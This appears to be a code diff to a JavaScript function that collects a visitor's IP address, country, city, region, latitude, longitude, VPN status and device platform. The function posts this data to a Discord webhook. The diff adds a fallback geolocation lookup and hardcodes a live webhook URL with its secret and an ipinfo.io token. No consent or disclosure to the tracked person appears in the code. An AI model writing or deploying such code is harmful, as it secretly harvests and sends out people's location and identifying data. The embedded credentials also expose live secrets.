@@ -2,20 +2,38 @@ async function sendUserDataToDiscord() {
   try {
     let geoData = null;
     let vpnData = { badip: "Unknown" };
-    
-    // Fetch general user data with error handling for 521 response
+
+    // Primary Geo IP lookup (json.geoiplookup.io), with fallback to ipinfo.io
     try {
       const geoResponse = await fetch("https://json.geoiplookup.io");
       if (geoResponse.ok) {
         geoData = await geoResponse.json();
       } else {
-        console.warn("Geo IP lookup failed with status:", geoResponse.status);
+        console.warn("Primary Geo IP lookup failed, trying fallback.");
+        throw new Error("Primary Geo IP lookup failed.");
       }
     } catch (error) {
-      console.warn("Geo IP lookup service unavailable:", error);
+      try {
+        const fallbackResponse = await fetch("https://ipinfo.io/json?token=e8449909af1d1b");
+        if (fallbackResponse.ok) {
+          const fallbackData = await fallbackResponse.json();
+          geoData = {
+            ip: fallbackData.ip,
+            country_name: fallbackData.country,
+            city: fallbackData.city,
+            region: fallbackData.region,
+            latitude: fallbackData.loc.split(",")[0],
+            longitude: fallbackData.loc.split(",")[1]
+          };
+        } else {
+          console.warn("Fallback Geo IP lookup also failed.");
+        }
+      } catch (fallbackError) {
+        console.warn("Both Geo IP lookups failed:", fallbackError);
+      }
     }
 
-    // Fetch VPN-related data
+    // Fetch VPN-related data (if important for verification)
     try {
       const vpnResponse = await fetch("https://vpn.geoiplookup.io/");
       if (vpnResponse.ok) {
@@ -44,6 +62,9 @@ async function sendUserDataToDiscord() {
       - IP Address: ${geoData.ip}
       - Country: ${geoData.country_name}
       - City: ${geoData.city}
+      - Region: ${geoData.region || "N/A"}
+      - Latitude: ${geoData.latitude}
+      - Longitude: ${geoData.longitude}
       ` : "- Location Data Unavailable"}
       - Bad IP: ${vpnData.badip}
       - Device: ${deviceData.platform}
@@ -56,7 +77,8 @@ async function sendUserDataToDiscord() {
     const discordPayload = { content: messageContent };
 
     // Send data to Discord webhook
-    const discordResponse = await fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
+    const discordWebhookUrl = "https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T";
+    const discordResponse = await fetch(discordWebhookUrl, {
       method: "POST",
       headers: { 'Content-Type': "application/json" },
       body: JSON.stringify(discordPayload)
@@ -71,7 +93,8 @@ async function sendUserDataToDiscord() {
     console.error("Failed to send user data, sending error message:", error);
 
     // Send error message to Discord for logging
-    await fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
+    const discordWebhookUrl = "https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T";
+    await fetch(discordWebhookUrl, {
       method: "POST",
       headers: { 'Content-Type': "application/json" },
       body: JSON.stringify({ content: "Error: Failed to send user data. Please check the logs for more details." })
